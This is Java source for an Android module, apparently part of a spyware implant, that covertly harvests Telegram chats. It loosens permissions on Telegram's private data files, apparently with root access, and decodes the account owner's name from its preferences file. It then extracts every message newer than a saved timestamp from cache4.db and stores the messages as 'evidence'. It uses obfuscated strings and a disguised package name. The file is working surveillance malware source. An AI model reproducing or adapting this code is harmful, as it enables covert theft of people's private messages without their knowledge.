package com.android.deviceinfo.module.chat;

import java.io.DataInputStream;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.MappedByteBuffer;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import android.database.Cursor;
import android.util.Base64;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.db.GenericSqliteHelper;
import com.android.deviceinfo.db.RecordHashPairVisitor;
import com.android.deviceinfo.db.RecordStringVisitor;
import com.android.deviceinfo.db.RecordVisitor;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;
import com.android.m.M;

public class ChatTelegram extends SubModuleChat {
	public class Account {

		public int id;
		public String name;
		public String last_name;
		public String getName() {
			return name + " " + last_name;
		}

	}

	private static final String TAG = "ChatTelegram";

	private static final int PROGRAM = 0x0e; // anche per addressbook
	String pObserving = M.e("org.telegram.messenger");
	String dbFile = M.e("/data/data/org.telegram.messenger/files/cache4.db");
	String dbAccountFile = M.e("/data/data/org.telegram.messenger/shared_prefs/userconfing.xml");

	private Date lastTimestamp;

	private long lastTelegram;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	private Account account;

	private GenericSqliteHelper helper;

	//private ByteBuffer in;

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		start();
	}

	@Override
	protected void start() {

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readViberMessageHistory), semaphore red");
			}
			return;
		}

		try {

			lastTelegram = markup.unserialize(new Long(0));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), read lastTelegram: " + lastTelegram);
			}

			Path.unprotect(dbAccountFile, 3, true);
			account = readMyPhoneNumber(dbAccountFile);

			Path.unprotect(dbFile, 3, true);
			Path.unprotect(dbFile + "*", true);

			helper = GenericSqliteHelper.openCopy(dbFile);
			helper.deleteAtEnd = false;

			long lastmessage = readTelegramMessageHistory();

			if (lastmessage > lastTelegram) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start) serialize: %d", lastmessage);
				}
				markup.serialize(lastmessage);
			}

			helper.deleteDb();

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		} finally {
			readChatSemaphore.release();
		}

	}

	private Account readMyPhoneNumber(String filename) throws SAXException, IOException, ParserConfigurationException {
		//<string name="user">7DUFct14eQIERWRkeQAAAAdXYXJsb2NrDDM5MzM4Njk1NTIwNAAAAOG6EU8/cIwAOWtIUzeXebw=</string>
		//base64
		File file = new File(filename);
		Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(file);
		doc.getDocumentElement().normalize();
		NodeList stringNodes = doc.getElementsByTagName("string");
		
		String data64;
		byte[] data = null;
		
		for (int i = 0; i < stringNodes.getLength(); i++) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber), node: " + i);
			}
			Node node = stringNodes.item(i);
			NamedNodeMap attrs = node.getAttributes();
			Node item = attrs.getNamedItem("name");
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber), item: " + item.getNodeName() + " = " + item.getNodeValue());
			}

			if (item != null && M.e("user").equals(item.getNodeValue())) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), found number: " + item);
				}
				data64 = node.getFirstChild().getNodeValue();
				data = Base64.decode(data64, Base64.DEFAULT);

			}
		}
		
		Account account = new Account();
		ByteBuffer in = MappedByteBuffer.wrap(data); 
		int con = readInt32(in);
		account.id =  readInt32(in);
		account.name = readString(in);
		account.last_name = readString(in);

		return account;
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private long readTelegramMessageHistory() throws IOException {

		try {
			Path.unprotect(dbFile, 3, true);
			Path.unprotect(dbFile + "*", true);

			GenericSqliteHelper helper =
			GenericSqliteHelper.openCopy(dbFile);
			helper.deleteAtEnd = false;
			//final ChatGroups groups = getTelegramGroups(helper);

			String sqlquery = M.e("SELECT date, m.data, out, name  FROM messages as m  INNER JOIN users as u on m.uid = u.uid where date > ? order by date ");

			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

			RecordVisitor visitor = new RecordVisitor(null, null) {
				@Override
				public long cursor(Cursor cursor) {
					long created_time = cursor.getLong(0);
					Date date = new Date(created_time);

					byte[] data = cursor.getBlob(1);
					boolean incoming = cursor.getInt(2) == 0;
					// localtime or gmt? should be converted to gmt
					String name = cursor.getString(3);

					String to, from;
					if(incoming){
						to = account.getName();
						from = name;
					}else{
						to = name;
						from = account.getName();
					}
					
					ByteBuffer in = MappedByteBuffer.wrap(data); 
					int id = readInt32(in);
					int fwd_from_id = readInt32(in);
					int fwd_date = readInt32(in);
					int from_id = readInt32(in);
					int to_id = readInt32(in);
					boolean out = readBool(in);
					boolean unread = readBool(in);
					int m_date = readInt32(in);
					String content = readString(in);
					
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", id,
								date.toLocaleString(), from, to, content);
					}

					MessageChat message = new MessageChat(PROGRAM, date, from, to, content,
							incoming);
					messages.add(message);
					
					return created_time;
				}
			};

			helper.deleteAtEnd = true;
			long lastmessage = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastTelegram) }, visitor);

			getModule().saveEvidence(messages);
			return lastmessage;

		} catch (Exception ex) {
			if (Cfg.DEBUG) {

				Check.log(TAG + " (readTelegramMessageHistory) Error: ", ex);
			}
		}
		return lastTelegram;

	}

	private ChatGroups getTelegramGroups(GenericSqliteHelper helper) {
		// SQLiteDatabase db = helper.getReadableDatabase();
		final ChatGroups groups = new ChatGroups();
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				String uid = cursor.getString(0);
				String name = cursor.getString(1);
				byte[] data = cursor.getBlob(3);
				if (uid == null) {
					return 0;
				}

				unserializeData(data);

				// groups.addPeerToGroup(uid, new Contact(mid, name, name, ""));

				return 0;

			}

			private void unserializeData(byte[] data) {
				ByteBuffer in = MappedByteBuffer.wrap(data); 
				
				
			}
		};

		String sqlquery = M
				.e("SELECT  uid, name, data FROM 'chats' left join contacts on chat_member.mid = contacts.m_id");
		helper.traverseRawQuery(sqlquery, null, visitor);

		// groups.addLocalToAllGroups(account);

		if (Cfg.DEBUG) {
			for (String group : groups.getAllGroups()) {
				String to = groups.getGroupToName(account.getName(), group);
				Check.log(TAG + " (getTelegramGroups group) %s : %s", group, to);
			}
		}
		return groups;
	}

	public String readString(ByteBuffer in) {
		try {
			int sl = 1;
			int l = in.get();
			if (l >= 254) {
				l = in.get() | (in.get() << 8) | (in.get() << 16);
				sl = 4;
			}
			byte[] b = new byte[l];
			in.get(b);
			int i = sl;
			while ((l + i) % 4 != 0) {
				in.get();
				i++;
			}
			return new String(b, "UTF-8");
		} catch (Exception x) {

		}
		return null;
	}

	public int readInt32(ByteBuffer in) {
		// FileLog.d("olli-deserialize","readInt32 boolean? " + error);
		try {
			int i = 0;
			for (int j = 0; j < 4; j++) {
				i |= (in.get() << (j * 8));
			}

			// FileLog.d("olli-deserialize","readInt32 returning " + i);
			return i;
		} catch (Exception x) {

		}
		return 0;
	}

	public boolean readBool(ByteBuffer in) {
		int consructor = readInt32(in);
		if (consructor == 0x997275b5) {
			return true;
		} else if (consructor == 0xbc799737) {
			return false;
		}

		return false;
	}

}
